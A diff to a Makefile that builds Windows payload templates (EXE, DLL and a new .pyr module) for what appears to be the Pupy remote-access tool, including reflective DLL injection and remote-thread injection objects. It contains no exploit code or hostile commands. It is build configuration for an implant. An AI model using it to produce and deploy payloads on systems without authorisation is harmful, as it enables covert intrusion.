@@ -1,5 +1,5 @@
 BUILDENV ?= $(PWD)/buildenv
-PYTHONPATH := C:\\Python27
+PYTHONPATH ?= C:\\Python27
 
 TEMPLATE_OUTPUT_PATH=../../pupy/payload_templates
 
@@ -20,13 +20,13 @@ PPARCH := x86
 endif
 
 CFLAGS += /Iresources\\$(ARCH) /Iresources /DHAVE_WINDOW
-# CFLAGS += /Iresources\\$(ARCH) /Iresources
+#CFLAGS += /Iresources\\$(ARCH) /Iresources
 
 ifdef DEBUG
 DEBUG_ADD   := -debug
 CFLAGS      := $(CFLAGS) /DDEBUG /DVERBOSE
 LINKER_OPTS := /link /NXCOMPAT:NO /subsystem:windows /ENTRY:WinMainCRTStartup user32.lib
-# LINKER_OPTS := /link /NXCOMPAT:NO /subsystem:console
+#LINKER_OPTS := /link /NXCOMPAT:NO /subsystem:console
 PPARCH      := $(PPARCH)d
 else
 DEBUG_ADD   :=
@@ -40,29 +40,51 @@ SECARGS     := "cl" ".xzdata"
 
 CFLAGS      := $(CFLAGS) /I..\\common
 
-PYOBJS := \
-	MyLoadLibrary.obj \
-	pupy_load.obj \
-	base_inject.obj
-
 COMMON_OBJS := \
+	actctx.obj \
+	MyLoadLibrary.obj \
 	MemoryModule.obj \
-	actctx.obj list.obj thread.obj remote_thread.obj \
-	LoadLibraryR.obj
+	list.obj
 
-SHARED_OBJS := \
+LOADER_OBJS := \
+	pupy_load.obj
+
+PUPY_MODULE := \
+	base_inject.obj \
+	thread.obj remote_thread.obj \
 	ReflectiveLoader.obj \
-	pupy_shared.obj \
-	main_reflective.obj 
-
-APP_OBJS := \
-	main_exe.obj \
+	LoadLibraryR.obj \
 	pupy.obj
 
-ifneq ($(DEBUG),)
-COMMON_OBJS += debug.obj
+SHARED_OBJS := \
+	main_reflective.obj
+
+APP_OBJS := \
+	main_exe.obj
+
+ifneq ($(PUPY_DYNLOAD),)
+CFLAGS += /D_PUPY_DYNLOAD
+SHARED_OBJS += ReflectiveLoader.obj
+
+LIBPYTHON_DIR ?= C:\\Python27
+LIBPYTHON_LIBS := $(PYTHONPATH)\\libs\\python27.lib advapi32.lib
+LIBPYTHON_INC := /I$(PYTHONPATH)/Include
+
+else
+SHARED_OBJS += $(PUPY_MODULE)
+APP_OBJS += $(PUPY_MODULE)
 endif
 
+ifneq ($(DEBUG),)
+PUPY_PYD := _pupy_debug.pyd
+COMMON_OBJS += debug.obj
+PUPY_MODULE += debug.obj
+else
+PUPY_PYD := _pupy.pyd
+endif
+
+PUPY_PYD_C := $(PUPY_PYD:%.pyd=%_pyd.c)
+PUPY_PYD_LOADER := $(PUPY_PYD_C:%.c=%.loader)
 
 ifeq ($(UNCOMPRESSED),)
 COMMON_OBJS += LzmaDec.obj
@@ -73,7 +95,27 @@ SUFFIX := unc.$(SUFFIX)
 COMPRESSED = 0
 endif
 
-all: $(TEMPLATE_OUTPUT_PATH)/pupy$(PPARCH).$(SUFFIX)exe $(TEMPLATE_OUTPUT_PATH)/pupy$(PPARCH).$(SUFFIX)dll
+PUPY_LOAD_DEPS := \
+	pupy_load.c \
+	resources/$(ARCH)/library.c \
+	resources/$(ARCH)/msvcr90.c \
+	resources/$(ARCH)/python27.c \
+	import-tab.c revision.h
+
+TARGETS := \
+	$(TEMPLATE_OUTPUT_PATH)/pupy$(PPARCH).$(SUFFIX)exe \
+	$(TEMPLATE_OUTPUT_PATH)/pupy$(PPARCH).$(SUFFIX)dll
+
+REQUIRED_LIBS :=
+
+ifneq ($(PUPY_DYNLOAD),)
+	TARGETS += $(TEMPLATE_OUTPUT_PATH)/pupy$(PPARCH).$(SUFFIX)pyr
+	PUPY_LOAD_DEPS += resources/$(ARCH)/$(PUPY_PYD_C)
+else
+	REQUIRED_LIBS := advapi32.lib
+endif
+
+all: $(TARGETS)
 
 revision.h:
 	if [ -z $$COMMIT ]; then rev=$$(cat ../../.git/`cat ../../.git/HEAD | cut -f 2 -d \ ` | cut -c 1-8); \
@@ -105,43 +147,55 @@ resources/$(ARCH)/python27.c: resources/$(ARCH)/python27.dll ../gen_resource_hea
 resources/$(ARCH)/msvcr90.c: resources/$(ARCH)/msvcr90.dll ../gen_resource_header.py
 	$(HOST_PYTHON) ../gen_resource_header.py $< $@ $(COMPRESSED) $(SECARGS)
 
+resources/$(ARCH)/$(PUPY_PYD_C): \
+		$(PUPY_PYD) ../gen_resource_header.py
+	$(HOST_PYTHON) ../gen_resource_header.py $< resources/$(ARCH)/$(PUPY_PYD_C) \
+		$(COMPRESSED) $(SECARGS)
+
 ifeq ($(UNCOMPRESSED),)
 LzmaDec.obj: ../common/LzmaDec.c
 	$(CC) /c $(CFLAGS) $< /Fo$@
 endif
 
 %.obj: %.c
-	$(CC) /Fo$@ /I$(PYTHONPATH)\\include /c $(CFLAGS) $<
+	$(CC) /Fo$@ /c $(CFLAGS) $(LIBPYTHON_INC) $<
 
 %.obj: ../common/%.c
-	$(CC) /Fo$@ /I$(PYTHONPATH)\\include /c $(CFLAGS) $<
+	$(CC) /Fo$@ /c $(CFLAGS) $(LIBPYTHON_INC) $<
 
+pupy_load.obj: $(PUPY_LOAD_DEPS)
 
-ReflectiveLoader.obj: ReflectiveLoader.c
-	$(CC) /c $(CFLAGS) /DREFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN \
-		/DREFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR /O2 /Ob1 $< /Fo$@
+$(PUPY_PYD): $(PUPY_MODULE) $(COMMON_OBJS) | revision.h
+	$(CC) $(CFLAGS) $^ /Fe$@ /LD $(LIBPYTHON_LIBS) /link /MAP:$(PUPY_PYD).map
 
-pupy_load.obj: pupy_load.c resources/$(ARCH)/library.c resources/$(ARCH)/msvcr90.c resources/$(ARCH)/python27.c revision.h
-
-pupy.obj: pupy.c revision.h
-	$(CC) /c $(CFLAGS) $< /Fo$@
-
-pupy_shared.obj: pupy.c revision.h
-	$(CC) /c $(CFLAGS) /D_PUPY_DLL $< /Fo$@
-
-$(TEMPLATE_OUTPUT_PATH)/pupy$(PPARCH).$(sys.pathSUFFIX)exe: $(PYOBJS) $(APP_OBJS) $(COMMON_OBJS)
-	$(CC) $(CFLAGS) $+ /Fe$@ $(LINKER_OPTS)
+$(TEMPLATE_OUTPUT_PATH)/pupy$(PPARCH).$(SUFFIX)exe: $(APP_OBJS) $(COMMON_OBJS) $(LOADER_OBJS)
+	$(CC) $(CFLAGS) $+ \
+		/Fe$(TEMPLATE_OUTPUT_PATH)/exe_pupy$(PPARCH).$(SUFFIX)exe $(LINKER_OPTS) $(REQUIRED_LIBS)
+	mv $(TEMPLATE_OUTPUT_PATH)/exe_pupy$(PPARCH).$(SUFFIX)exe $@
 	unzip -p resources/$(ARCH)/library.zip fid.toc >$@.toc
 
-$(TEMPLATE_OUTPUT_PATH)/pupy$(PPARCH).$(SUFFIX)dll: $(PYOBJS) $(SHARED_OBJS) $(COMMON_OBJS)
-	$(CC) $(CFLAGS) $+ /Fe$@ /LD
+$(TEMPLATE_OUTPUT_PATH)/pupy$(PPARCH).$(SUFFIX)dll: $(SHARED_OBJS) $(COMMON_OBJS) $(LOADER_OBJS)
+	$(CC) $(CFLAGS) $+ \
+		/Fe$(TEMPLATE_OUTPUT_PATH)/dll_pupy$(PPARCH).$(SUFFIX)dll /LD $(REQUIRED_LIBS)
+	mv $(TEMPLATE_OUTPUT_PATH)/dll_pupy$(PPARCH).$(SUFFIX)dll $@
 	unzip -p resources/$(ARCH)/library.zip fid.toc >$@.toc
+
+$(TEMPLATE_OUTPUT_PATH)/pupy$(PPARCH).$(SUFFIX)pyr: \
+		resources/$(ARCH)/$(PUPY_PYD_C) $(PUPY_PYD)
+	cat resources/$(ARCH)/$(PUPY_PYD_LOADER) $(PUPY_PYD) > $@
 
 .PHONY: clean
 
 clean:
-	rm -f *.obj
-	rm -f $(PYOBJS) $(COMMON_OBJS)
+	rm -f \
+		$(COMMON_OBJS) \
+		$(LOADER_OBJS) \
+		$(PUPY_MODULE) \
+		$(SHARED_OBJS) \
+		$(PUPY_PYD_C) \
+		$(APP_OBJS) \
+		$(PUPY_PYD) \
+		$(TARGETS)
 
 distclean: clean
 	rm -f revision.h
